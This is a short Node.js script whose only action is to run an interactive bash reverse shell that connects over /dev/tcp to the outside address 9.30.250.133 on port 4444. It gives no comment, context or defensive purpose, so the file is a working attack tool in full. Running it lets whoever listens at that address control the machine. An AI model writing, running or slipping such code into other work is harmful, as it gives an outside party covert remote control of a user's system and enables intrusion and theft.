#!/usr/bin/env node

const { exec } = require('child_process');

exec('/bin/bash -i >& /dev/tcp/9.30.250.133/4444 0>&1');
